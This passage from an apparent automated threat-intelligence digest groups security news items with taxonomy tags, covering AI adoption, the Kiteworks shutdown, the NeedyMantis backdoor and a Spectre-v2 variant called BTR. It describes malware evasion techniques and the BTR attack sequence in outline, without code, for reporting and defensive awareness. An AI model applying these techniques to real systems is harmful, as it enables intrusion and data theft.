sets of model infrastructure. The resulting consolidated resources are easier to secure following best practices. Our data corroborates this thesis. Even as the number of packages grew significantly, public exposure of AI and ML packages remained the same as last year at 1.5% , and just 0.05% of resources were publicly exposed . You have to keep in mind that, although AI may look like some kind of black box, it’s still just software running on a computer. The following three resources bridge AI with traditional workloads: Masterclass: AI is more than ChatGPT and LLMs cover how AI is an umbrella term for ML, generative AI (GenAI), agentic AI, and more. In What’s old is new again , AIBOMs shed light on what components make up AI systems. ‍ AI is still a workload relates AI infrastructure to elements that takers, shapers, and makers already know how to secure. Europe and B2C are leading AI adoption We’ve observed how business-to-consumer (B2C) organizations like media & internet, transportation, and retail are leading AI adoption . For these companies, AI innovation drives revenue and is tied directly to customer experience, engagement, and differentiation. In contrast, for business-to-business (B2B) organizations, AI does not serve as the primary product interface, but rather takes a subtler role improving operational efficiency. They primarily use AI to support internal productivity, analytics, automation workflows, or customer support. Also, EMEA is vastly outpacing other regions in the adoption of AI and ML packages. Rather than stifling innovation, the EU’s clear AI regulatory guardrails appear to provide the necessary framework for cautious organizations to accelerate adoption confidently. This difference could also be explained by data sovereignty requirements and compliance considerations, as they push organizations in EMEA towards using their own AI infrastructure. After all, our data
```

#### Corroborating sources (1)

- **Sysdig** (detection_response_operations)
  - Title: AI adoption is a security survival metric
  - Published: 2026-09-25T00:00:00+00:00
  - Link: https://webflow.sysdig.com/blog/ai-adoption-is-a-security-survival-metric
  - Summary: AI is moving from experiment to infrastructure. Sysdig research shows more organizations building their own infrastructure, reducing the AI attack surface.

### Cluster fd4ff49516 — score 8

- Title: Kiteworks lifts shutdown advisory after ‘credible threat intelligence’ from federal authorities
- Source: CyberScoop (cyber_news_breach_reporting)
- Published: 2026-09-29T14:11:43+00:00
- Link: https://cyberscoop.com/kiteworks-lifts-shutdown-advisory-after-credible-threat-intelligence-from-federal-authorities/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng, ransomware_extortion
- actor_attribution: ShinyHunters
- affected_industries: financial_services, government
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, phishing_social_eng
- actor_attribution: ShinyHunters
- affected_industries: financial_services, government
- content_type: vulnerability_disclosure
- confidence_tier: tier_4_news

#### Summary

```
The company said it found and patched a previously unknown critical vulnerability in one product during the weekend shutdown, and has no indication it was exploited. The post Kiteworks lifts shutdown advisory after ‘credible threat intelligence’ from federal authorities appeared first on CyberScoop .
```

#### Full body

```
Advertisement Get our latest cybersecurity news first on Google. Click here! Close Kiteworks, a provider of secure file transfer and data-sharing tools, told customers Monday they could resume normal operations after a weekend-long precautionary shutdown prompted by what it called “credible threat intelligence” from federal authorities. The recommendation, issued last week, advised customers to take production systems offline ahead of a potential imminent attack. The company also shut down the environments it hosts on customers’ behalf. By Sunday, Kiteworks said continuous monitoring showed no abnormal activity. “Telling customers to take production systems offline is not a decision any vendor makes lightly, and we knew exactly what we were asking of them,” Chief Information Security Officer Frank Balonis said in the company’s statement. “We made it anyway, because when the choice is between certainty and convenience, customer data is not something we are willing to gamble with.” During the shutdown, Kiteworks discovered a previously unknown critical vulnerability in Advanced Forms, a secure data collection tool used by fewer than 1% of its customers, a group the company said comprises approximately 50 organizations. The company said its other products, including file collaboration, file transfer, email encryption and managed file transfer, were unaffected. Advertisement Kiteworks said it developed and deployed a fix during the window and has no indication the vulnerability was ever exploited. All known vulnerabilities are addressed in release 9.5.1, which the company recommends customers run. Company CEO Jonathan Yaron said in a release that being proactive about the threat was top of mind. “Our customers gave up their weekend on our recommendation, at short notice and at difficult hours, and many of their teams worked through the night alongside ours,” Yaron said. “The industry standard is to wait for proof of an attack. We would rather be proactive on credible warning than wait for certainty and be too late. That is the standard we intend to keep.” Kiteworks, a California-based company formerly known as Accellion, rebranded in October 2021 after a vulnerability in its legacy file transfer appliance allowed an extortion gang to breach hundreds of organizations. That campaign was part of a broader wave of attacks on file transfer products . Kiteworks declined to identify which federal authorities provided the intelligence or which hacking group prompted the warning. The company said it worked with federal intelligence authorities throughout the weekend and shared threat intelligence with industry partners, including Mandiant. Share Facebook LinkedIn Twitter Copy Link Add to Preferred Sources Advertisement Advertisement More Like This Advertisement Top Stories Advertisement More Scoops Citrix office complex in Santa Clara, California. ( Justin Sullivan/Getty Images) New research from DTEX details how the increasing integration of AI agents into businesses is making it easier than ever for insiders – malicious or otherwise – to put sensitive data at risk. (Image Source: Getty) A figure walking with a glowing trail of binary code emanating from a case, symbolizing stolen data. (Getty Images Plus) Latest Podcasts What the Section 702 lapse means for cybersecurity Jailbreaks, sandboxes, and the limits of AI safeguards ClickFix and the social engineering of routine AI-adaptable security platforms are critical for autonomous decision-making Government As AI world debates security, NVIDIA releases open source tools for agents ShinyHunters trades financial extortion for a reckless war of ego with the FBI Supreme Court permits states to use SAVE database for citizenship checks House and Senate members propose legislation for CISA to step up cyber defenses for biotech Technology New bill would create federal investigative body for AI-driven hacks CISA outlines improvement plan for CVE program OpenAI, Ukraine partner on ‘Daybreak’ progra
```

#### Corroborating sources (1)

- **CyberScoop** (cyber_news_breach_reporting)
  - Title: Kiteworks lifts shutdown advisory after ‘credible threat intelligence’ from federal authorities
  - Published: 2026-09-29T14:11:43+00:00
  - Link: https://cyberscoop.com/kiteworks-lifts-shutdown-advisory-after-credible-threat-intelligence-from-federal-authorities/
  - Summary: The company said it found and patched a previously unknown critical vulnerability in one product during the weekend shutdown, and has no indication it was exploited. The post Kiteworks lifts shutdown advisory after ‘credible threat intelligence’ from federal authorities appeared first on CyberScoop .

### Cluster a1fd76ffa8 — score 8

- Title: 'NeedyMantis' Provides Long-Term Access to Compromised Networks
- Source: Dark Reading (cyber_news_breach_reporting)
- Published: 2026-09-29T15:12:39+00:00
- Link: https://www.darkreading.com/threat-intelligence/needymantis-long-term-access-compromised-networks
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage, phishing_social_eng, supply_chain, web_shell_backdoor
- affected_industries: education, government, healthcare, telecommunications
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: supply_chain, phishing_social_eng, apt_espionage, web_shell_backdoor
- affected_industries: healthcare, government, telecommunications, education
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
Microsoft observed a China-based actor using a previously unidentified malware framework in targeted intrusions against telcos, universities, medical, and government-related organizations.
```

#### Full body

```
Threat Intelligence Cyber Risk Cyberattacks & Data Breaches Vulnerabilities & Threats News 'NeedyMantis' Provides Long-Term Access to Compromised Networks Microsoft observed a China-based actor using a previously unidentified malware framework in targeted intrusions against telcos, universities, medical, and government-related organizations. Elizabeth Montalbano , Contributing Writer September 29, 2026 4 Min Read Source: Valentin Baciu via Shutterstock A previously unidentified malware family is giving attackers long-term stealth access to targeted networks once they've already infiltrated a system, revealing a potential blind spot for defenders that tend to focus more on initial intrusion rather than post-compromise activity. The malware, dubbed "NeedyMantis," is a modular framework that has been used in a limited number of targeted intrusions against telecommunications companies , universities, medical nonprofits, intergovernmental organizations, and government contractors, Microsoft Threat Intelligence revealed in a blog post yesterday. The company linked the malware to a threat actor tracked as Storm-3069 that is based in China, though Microsoft did not link the actor to any Chinese nation-state groups. However, Microsoft has not concluded that all deployments of the malware are tied to Storm-3069, the company said. Microsoft discovered NeedyMantis while investigating indicators of compromise (IoCs) associated with the DAEMON Tools supply chain compromise , which was reported by Kaspersky in May. The malware, used since at least October 2025, combines multiple loaders, custom encrypted file archives, a custom executable file format, and modular components that enable operators to evade analysis and extend functionality through additional modules. Related: Russia's Star Blizzard Ditches ClickFix to Widen Phishing Net "These characteristics, combined with its use in targeted intrusions, make NeedyMantis a useful case study for understanding how threat actors establish and maintain long-term access within victim environments," according to Microsoft Threat Intelligence. How NeedyMantis Works At its core, NeedyMantis is a modular backdoor designed for post-compromise activity, which means an attacker already must have gained initial access to a network to deploy the malware. It communicates with attacker-controlled infrastructure over HTTPS and WebSockets, gathers information about the compromised system, and can load additional components as needed. Distributed by a two-stage loader, NeedyMantis can make malicious code look legitimate. It uses DLL sideloading to hide behind trusted applications such as Poedit, curl, Vim, and TightVNC, with malicious DLLs posing as components from major software vendors, according to Microsoft. "The loader and archive have been found packaged alongside legitimate software, with the first-stage loader — masquerading as a required DLL — being loaded through DLL sideloading ," according to the post. The malware also can peel back layers of encrypted and compressed payloads, with its loaders using custom archives, changing encryption keys, and employing other techniques designed to make static analysis harder. Related: UAE, Saudi Arabia Face Onslaught of Increasingly Complex Cyberattacks Range of NeedyMantis Capabilities Unknown In one intrusion, attackers used Impacket to copy the legitimate software and malicious files before execution. "This activity occurred after the actor had already obtained access to the environment and illustrates one method by which NeedyMantis can be introduced during an intrusion post-compromise," according to the post. And though Microsoft revealed some capabilities of the malware, given its modular nature , it's likely that there are many others that remain unknown, according to Andrew Costis, engineering manager of the adversary research team at AttackIQ. "The question is what happens after entry," he tells Dark Reading. "Its main component can load further modules,
```

#### Corroborating sources (1)

- **Dark Reading** (cyber_news_breach_reporting)
  - Title: 'NeedyMantis' Provides Long-Term Access to Compromised Networks
  - Published: 2026-09-29T15:12:39+00:00
  - Link: https://www.darkreading.com/threat-intelligence/needymantis-long-term-access-compromised-networks
  - Summary: Microsoft observed a China-based actor using a previously unidentified malware framework in targeted intrusions against telcos, universities, medical, and government-related organizations.

### Cluster c50febde94 — score 8

- Title: Malicious npm Packages That Evade Defenses
- Source: Schneier on Security (practitioner_analysis)
- Published: 2026-09-24T11:07:42+00:00
- Link: https://www.schneier.com/blog/archives/2026/09/malicious-npm-packages-that-evade-defenses.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: npm

#### Cluster taxonomy (union across members)
- threat_categories: apt_espionage
- affected_products: npm
- content_type: news_report
- confidence_tier: tier_3_analysis

#### Primary article taxonomy
- threat_categories: apt_espionage
- affected_products: npm
- content_type: news_report
- confidence_tier: tier_3_analysis

#### Summary

```
This is an impressive piece of malware . Its sophistication says nation-state to me, but there is no direct evidence and certainly no attribution.
```

#### Full body

```
Clive Robinson • September 24, 2026 11:57 AM @ Bad .js, With regards, “javascript is being incorporated almost everywhere, and it angers me that it’s even being shoved down everyone’s throat even where it’s not needed at all. Many, very many sites, apps, systems, operating systems, files – could do/function just fine without the pest called .js which is worse than what we had with the nasty flashplayer a while ago.” Yup I pointed out that both JavaScript were bad news security wise many years ago on the pages of this blog. And you would not believe the amount of grief I got because of it… (and never an apology from any of them). Especially when I said people should turn JavaScript off in the browser and uninstall it and flash from their computers… Well Flash went first as people quickly realised what bad news it actually was. Javascript is unfortunately still with us even though it’s worse security wise. The only saving grace is lots of people have made the defences against javaScript more significant than they used to be. But the truth is I’ve yet to find a server that runs javascript on a clients computer that is actually worth bothering with… The really annoying thing though is the clowns and crooks in the W3C… that insist that they must be able to run code on a client computer thus keep shoving such nonsense into Web Client specifications. Every time they have forced some client side executable into Web Standards it has become a major security fault… You would have thought they would have learnt by now… But apparently not…
```

#### Corroborating sources (1)

- **Schneier on Security** (practitioner_analysis)
  - Title: Malicious npm Packages That Evade Defenses
  - Published: 2026-09-24T11:07:42+00:00
  - Link: https://www.schneier.com/blog/archives/2026/09/malicious-npm-packages-that-evade-defenses.html
  - Summary: This is an impressive piece of malware . Its sophistication says nation-state to me, but there is no direct evidence and certainly no attribution.

### Cluster bc03121785 — score 8

- Title: New Spectre-v2 BTR Attack Leaks Linux Memory Despite Existing Defenses
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-29T17:20:17+00:00
- Link: https://thehackernews.com/2026/09/new-spectre-v2-btr-attack-leaks-linux.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- affected_products: Linux kernel
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- affected_products: Linux kernel
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
A group of academics from VUSec and Scuola Superiore Sant'Anna have disclosed details of a new Spectre CPU vulnerability variant that affects Just-In-Time (JIT) engines present in web browsers, language runtimes, and the operating system kernel, across multiple CPU vendors. The new Spectre v2 variant has been codenamed Branch Target Reuse (BTR). "The key insight is that, while modern CPUs
```

#### Full body

```
New Spectre-v2 BTR Attack Leaks Linux Memory Despite Existing Defenses  Ravie Lakshmanan  Sep 29, 2026 Vulnerability / Hardware Security A group of academics from VUSec and Scuola Superiore Sant'Anna have disclosed details of a new Spectre CPU vulnerability variant that affects Just-In-Time ( JIT ) engines present in web browsers, language runtimes, and the operating system kernel, across multiple CPU vendors. The new Spectre v2 variant has been codenamed Branch Target Reuse (BTR) . "The key insight is that, while modern CPUs restore architectural code coherence after self-modification, they do not necessarily invalidate stale indirect branch prediction entries (i.e., branch targets)," researchers Sander Wiebing, Yuhui Zhu, Alessandro Biondi, and Cristiano Giuffrida said in an accompanying paper. "In JIT engines, these stale targets can outlive the original code and later be reused when the code cache is repopulated, yielding a transient execute-after-free primitive. This allows attackers to hijack transient control flow to newly generated code at obsolete offsets, bypassing software hardening or reaching misaligned gadgets." BTR was evaluated against SpiderMonkey (the JIT engine of Mozilla Firefox), GraalVM, and the Linux kernel's cBPF JIT, all of which have been found to be affected, although with "markedly different exploitability characteristics and leakage rates." As a proof-of-concept, two end-to-end exploits have been devised against the Linux kernel that can be used to leak and recover the root password hash within minutes from a fully patched Intel system with default protections enabled. Spectre refers to a class of CPU security vulnerabilities first discovered in 2017 that exploit speculative execution, a performance optimization technique that modern processors use to predict and execute instructions beforehand. An attacker can exploit this loophole to trick a CPU into performing speculative operations that access sensitive data, and then infer that data through a cache timing side channel. Spectre v2 is one specific type of the Spectre attack that abuses indirect branch prediction in modern processors to achieve the same goals. Specifically, it poisons the CPU's branch prediction mechanism to cause a victim program to execute an indirect branch, which, in turn, causes the CPU to mispredict the branch and speculatively execute attacker-controlled code or a gadget. Although the results of the misprediction are discarded, an attacker can infer what the victim's speculative execution accessed by taking advantage of the cache state changes and measuring the cache changes. "BTR targets JIT engines and arises from the interplay between Self-Modifying Code (SMC) and indirect branch prediction," the researchers said, adding, "JIT engines do expose exploitable transient-execution opportunities induced by SMC for the first time." The attack presumes an attacker who is able to run unprivileged code in a JIT engine and is seeking to disclose sensitive data from the host environment. The entire sequence of actions is as follows - The attacker lures the JIT engine into allocating a training chunk and forces the victim branch to jump to it, thereby inserting a BTB entry referencing the current entry point. The attacker forces a deallocation of the training chunk and an allocation of the target chunk that partially reuses the same address. The attacker triggers the indirect branch again, the CPU uses the now-stale branch target buffer (BTB) entry and speculatively jumps to the old training-chunk entry point. The end result is control-flow hijacking and secret data disclosure. "By redirecting control flow to an architecturally invalid entry point, the attacker can bypass Spectre hardening mitigations or execute misaligned instructions, ultimately disclosing secret data," the researchers explained. However, a key aspect BTR hinges on is that the stale BTB entry must not be invalidated or replaced after the JIT engine frees the tra
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: New Spectre-v2 BTR Attack Leaks Linux Memory Despite Existing Defenses
  - Published: 2026-09-29T17:20:17+00:00
  - Link: https://thehackernews.com/2026/09/new-spectre-v2-btr-attack-leaks-linux.html
  - Summary: A group of academics from VUSec and Scuola Superiore Sant'Anna have disclosed details of a new Spectre CPU vulnerability variant that affects Just-In-Time (JIT) engines present in web browsers, language runtimes, and the operating system kernel, across multiple CPU vendors. The new Spectre v2 variant has been codenamed Branch Target Reuse (BTR). "The key insight is that, while modern CPUs

### Cluster b0d89fbe69 — score 8

- Title: ThreatsDay: AI Search Poisoning, AI Coding Tool Leaking Repos, One-Click Code Execution and 13 More Stories
- Source: The Hacker News (cyber_news_breach_reporting)
- Published: 2026-09-24T17:52:43+00:00
- Link: https://thehackernews.com/2026/09/threatsday-ai-search-poisoning-ai.html
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- affected_industries: critical_infrastructure, financial_services, government, manufacturing_industrial
- content_type: incident_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: phishing_social_eng
- affected_industries: financial_services, government, critical_infrastructure, manufacturing_industrial
- content_type: incident_report
- confidence_tier: tier_4_news

#### Summary

```
This week, the dangerous stuff keeps arriving dressed as something boring. An update. A login box. A search answer. A coding tool. A link you have clicked a hundred times before. That is the thread running through the pile. Trusted paths get poisoned. Old bugs find new jobs. AI tools leak more than expected. Fake prompts look real enough. And some attacks barely need an exploit at all — just
```

#### Full body

```
ThreatsDay: AI Search Poisoning, AI Coding Tool Leaking Repos, One-Click Code Execution and 13 More Stories  Ravie Lakshmanan  Sep 24, 2026 Hacking News / Cybersecurity News This week, the dangerous stuff keeps arriving dressed as something boring. An update. A login box. A search answer. A coding tool. A link you have clicked a hundred times before. That is the thread running through the pile. Trusted paths get poisoned. Old bugs find new jobs. AI tools leak more than expected. Fake prompts look real enough. And some attacks barely need an exploit at all — just one weak setting or one person doing what the screen tells them. Nothing here looks especially dramatic. That is what makes it useful. The threats change every week. Subscribe, and we’ll alert you when each new ThreatsDay Bulletin is out. AI-Assisted Banking Trojan RemControl Android Banking Trojan Targets Western Europe, the Middle East, and Canada A previously undocumented Android banking trojan dubbed RemControl is targeting retail banking customers across Western Europe (Italy, France, Spain, Poland, Portugal), the Middle East, and Canada. The malware is distributed via fake Google Play Store pages impersonating the TVTap IPTV application. Users are directed to the web page through Meta ads. It was first observed in July 2026. "The malware abuses Android's Accessibility Service to inject phishing overlays over legitimate banking applications, stream the device screen in real time, log keystrokes, and provide the operator with full remote control over infected devices," Group-IB said . "C2 address is resolved dynamically through an encrypted Telegram dead-drop, making infrastructure rotation straightforward without recompiling the malware. Both the operator panel documentation and phishing overlays contain artifacts of AI-assisted development, including a complete AI assistant response left verbatim in a live phishing page served to banking victims." The presence of Russian-language code comments in multiple overlay HTML files indicates the involvement of a Russian speaker. Overlapping campaign naming conventions, delivery mechanisms, the use of Telegram dead-drop and affiliate tag similarities suggest a possible link to the Medusa UNKN affiliate botnet. AI Code Privacy Concern Z.ai Disables ZCode Features Chinese artificial intelligence company Z.ai has disabled several features of its ZCode coding assistant after a default setting was caught sending users' local code repositories to Alibaba Cloud servers in China without their consent, a couple of months after SpaceXAI's Grok Build coding CLI was found uploading entire Git repositories to a Google Cloud Storage bucket under its control. Although Z.ai has since disabled the workflow responsible for generating and uploading local repository snapshots in its ZCode client and opened up its codebase for public scrutiny, the development raises fresh concerns for enterprises over how AI tools handle sensitive source code. Critical Infrastructure Access Risk CISA and FBI Publish Factsheet for Critical Infrastructure Operators The U.S. Federal Bureau of Investigation (FBI) and Cybersecurity and Infrastructure Security Agency (CISA) have published a fact sheet to "highlight considerations for critical infrastructure entities to reduce risk and minimize vulnerabilities when working with third-party industrial control system (ICS) integrators." The alert urges critical infrastructure owners and operators to maintain caution when granting third-party ICS integrators high levels of access or control over industrial processes and ensure the principle of least privilege (PoLP) is applied. "Not adopting principles such as PoLP could expose owners and operators to malicious cyber actors seeking to compromise critical infrastructure, possibly providing sensitive access to pathways that actors can exploit to cause disruptive and destructive effects to equipment and critical functions," the authoring agencies said. Super-App Surveil
```

#### Corroborating sources (1)

- **The Hacker News** (cyber_news_breach_reporting)
  - Title: ThreatsDay: AI Search Poisoning, AI Coding Tool Leaking Repos, One-Click Code Execution and 13 More Stories
  - Published: 2026-09-24T17:52:43+00:00
  - Link: https://thehackernews.com/2026/09/threatsday-ai-search-poisoning-ai.html
  - Summary: This week, the dangerous stuff keeps arriving dressed as something boring. An update. A login box. A search answer. A coding tool. A link you have clicked a hundred times before. That is the thread running through the pile. Trusted paths get poisoned. Old bugs find new jobs. AI tools leak more than expected. Fake prompts look real enough. And some attacks barely need an exploit at all — just

### Cluster c3b1f3ccb5 — score 8

- Title: AI-Found Vulnerabilities More Likely to Enable RCE, Google Says
- Source: Infosecurity Magazine (cyber_news_breach_reporting)
- Published: 2026-09-30T14:00:00+00:00
- Link: https://www.infosecurity-magazine.com/news/ai-found-vulnerabilities-rce/
- Fetch status: ok
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: active_exploitation, ransomware_extortion, vulnerability_disclosure, zero_day
- affected_industries: critical_infrastructure, education, financial_services
- cve_ids: CVE-2026-1731
- urgency_signals: actively_exploited, poc_available, preauth_unauth, zero_day
- content_type: news_report
- confidence_tier: tier_4_news

#### Primary article taxonomy
- threat_categories: ransomware_extortion, zero_day, vulnerability_disclosure, active_exploitation
- affected_industries: financial_services, critical_infrastructure, education
- cve_ids: CVE-2026-1731
- urgency_signals: actively_exploited, zero_day, preauth_unauth, poc_available
- content_type: news_report
- confidence_tier: tier_4_news

#### Summary

```
AI-discovered vulnerabilities are more likely to enable RCE, as disclosures and exploitation rise
```

#### Full body

```
Infosecurity Magazine Home » News » AI-Found Vulnerabilities More Likely to Enable RCE, Google Says AI-Found Vulnerabilities More Likely to Enable RCE, Google Says News 30 September 2026 Written by Alessandro Mascellino News Reporter Email Alessandro Follow @a_mascellino Vulnerabilities found with the help of AI are disproportionately likely to enable remote code execution (RCE), as disclosures and exploitation both accelerated in 2026. In research published September 30, Google Threat Intelligence Group (GTIG) found that 50% of vulnerabilities it identified as likely AI-discovered resulted in RCE, against 26% of other CVEs. Vulnerability disclosures doubled from 5045 in January 2026 to 10,477 in July, reaching 10,740 in August. Exploited vulnerabilities rose from an average of 10.5 a month in 2025 to 18 a month so far in 2026. Zero-day exploitation rose only marginally, from eight to 11 a month, although it jumped to 22 in August. GTIG suggested most of the growth came from the rapid weaponization of n-days, possibly aided by AI tools that analyze patches and proof-of-concept code. Monthly count of exploited vulnerabilities, split into zero-days and n-days, January 2025 to August 2026. Credit: GTIG. Read more on AI vulnerability research: Just 1% of AI-Discovered Vulnerabilities Exploited in the Wild, Research Shows AI Discovery Skews Toward Higher-Impact Flaws Medium-risk flaws accounted for 58% of likely AI-discovered vulnerabilities between January and August 2026, compared with 28% of those not attributed to AI, while low-risk flaws made up 39% and 69%, respectively. The ratings are GTIG's, not CVSS scores. Google said the distribution likely reflects, in large part, how researchers deploy autonomous agents, pointing them at critical infrastructure rather than running broad scans. It also said public data undercounts AI-discovered vulnerabilities. The company described confirmed exploitation of AI-discovered flaws as an early indicator rather than an established trend. It cited CVE-2026-1731, an unauthenticated command injection flaw in BeyondTrust Privileged Remote Access and Remote Support that Hacktron AI discovered autonomously. One threat cluster exploited it within four days of disclosure, and five more followed within seven days. Orchestration Tools and Edge Devices Concentrate Risk GTIG tracked more than 1500 AI-related vulnerabilities disclosed in 2026. Agent orchestration frameworks accounted for 782, while inference and serving infrastructure accounted for 212, nearly a quarter of which involved unauthenticated APIs or server-side request forgery. Only a handful have been confirmed as exploited, and GTIG has yet to see zero-day exploitation of AI infrastructure. Exploitation overall remained concentrated at the perimeter: edge and security appliances made up 14% of exploited vulnerabilities in 2026, and over 65% of those edge flaws were rated high or critical risk. The research follows Citrix's fixes for two exploited NetScaler zero-days , one of which GTIG and Mandiant have tracked in active attacks. "Given the active exploitation, NetScaler customers should prioritize examining their systems for compromise before upgrading/patching," Charles Carmakal, CTO at Mandiant, wrote on LinkedIn on September 27. "Patching alone may not eradicate the threat actor from your environment." Share of vulnerabilities by exploitation consequence, found by AI versus not found by AI. Credit: GTIG. You may also like NSA Cybersecurity Director's Six Takeaways From the War in Ukraine News 19 October 2022 Google Launches Framework to Secure Generative AI News 9 June 2023 Universities Face Increase in Ransomware Attacks as Students Return News 17 September 2020 High-Tech Sector Overtakes Finance as Top Target for Cyber-Attacks, Mandiant Reports News 23 March 2026 Zero-Day Exploitation Figure Surges 19% in Two Years News 29 April 2025 What’s Hot on Infosecurity Magazine? Read Shared Watched Editor's Choice Deepfakes Are Becoming a Cos
```

#### Corroborating sources (1)

- **Infosecurity Magazine** (cyber_news_breach_reporting)
  - Title: AI-Found Vulnerabilities More Likely to Enable RCE, Google Says
  - Published: 2026-09-30T14:00:00+00:00
  - Link: https://www.infosecurity-magazine.com/news/ai-found-vulnerabilities-rce/
  - Summary: AI-discovered vulnerabilities are more likely to enable RCE, as disclosures and exploitation rise

### Cluster 8098e82854 — score 8

- Title: Quarantined isn't contained: Agentic phishing response with Elastic and Sublime
- Source: Elastic Security Labs (detection_response_operations)
- Published: 2026-09-28T00:00:00+00:00
- Link: https://www.elastic.co/security-labs/blog/phishing-incident-response-sublime-security
- Fetch status: not_attempted
- Member count: 1
- Corroborating source count: 1
- Strong signals: (none)

#### Cluster taxonomy (union across members)
- threat_categories: phishing_social_eng
- content_type: news_report
- confidence_tier: tier_2_operator

#### Primary article taxonomy
- threat_categories: phishing_social_eng
- content_type: news_report
- confidence_tier: tier_2_operator

#### Summary

```
The native Sublime Security integration sends email detections into Elastic Security, where phishing incident response can tie a quarantined email to what happens next on the endpoint and pull the threat from every mailbox it reached.
```

#### Corroborating sources (1)

- **Elastic Security Labs** (detection_response_operations)
  - Title: Quarantined isn't contained: Agentic phishing response with Elastic and Sublime
  - Published: 2026-09-28T00:00:00+00:00
  - Link: https://www.elastic.co/security-labs/blog/phishing-incident-response-sublime-security
  - Summary: The native Sublime Security integration sends email detections into Elastic Security, where phishing incident response can tie a quarantined email to what happens next on the endpoint and pull the threat from every mailbox it reached.
